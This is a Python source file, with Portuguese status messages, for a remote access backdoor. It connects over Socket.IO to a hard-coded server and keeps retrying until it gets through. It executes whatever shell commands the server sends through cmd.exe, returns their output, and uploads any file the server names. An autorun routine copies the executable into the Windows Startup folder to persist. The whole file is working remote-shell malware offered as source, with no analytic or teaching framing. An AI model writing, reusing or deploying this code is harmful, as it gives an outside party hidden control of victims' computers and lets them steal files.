import socketio
import subprocess
import os
import time

sio = socketio.Client()

current_directory = os.getcwd()

def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename)) 

@sio.event
def connect():
    print("Conectado ao servidor!")
    update_directory()

def update_directory():
    global current_directory
    sio.emit('directory_update', {'directory': current_directory})

@sio.event
def response(data):
    if 'data' in data:
        print(f"Resposta do servidor: {data['data']}")
    else:
        print("Resposta inesperada do servidor:", data)

@sio.event
def execute_command(command):
    global current_directory

    if command.startswith('upload '):
        file_path = command.split(' ')[1]
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                file_data = f.read()
            sio.emit('file_upload', {'file_name': os.path.basename(file_path), 'file_data': file_data})
            print(f"Arquivo {file_path} enviado.")
        else:
            print(f"Erro: Arquivo '{file_path}' não encontrado.")
        return

    
    if command.strip() == "":
        output = subprocess.run("", shell=True, capture_output=True, text=True).stdout
        
    elif command.strip().lower() == "help":
        output = subprocess.run("help", shell=True, capture_output=True, text=True).stdout
    
    elif command.strip().lower() == "powershell":
        output = subprocess.run("powershell.exe", shell=True, capture_output=True, text=True).stdout
    
    elif command.startswith('cd '):
        new_directory = command[3:].strip()
        try:
            os.chdir(new_directory)
            current_directory = os.getcwd()
            output = f"{current_directory}"
        except FileNotFoundError:
            output = f"Erro: Diretório '{new_directory}' não encontrado."
    else:
        resultado = subprocess.run(f'cmd.exe /c {command}', shell=True, capture_output=True, text=True)
        output = resultado.stdout if resultado.returncode == 0 else resultado.stderr
        if output == "":
            output = resultado.stderr

    sio.emit('command_response', {'output': output})
    update_directory()

while True:
    try:
        sio.connect('http://192.168.3.46:5000')
        break  
    except Exception as e:
        print(f"Conexão falhou: {e}. Tentando novamente em 3 segundos...")
        time.sleep(3)


sio.wait()
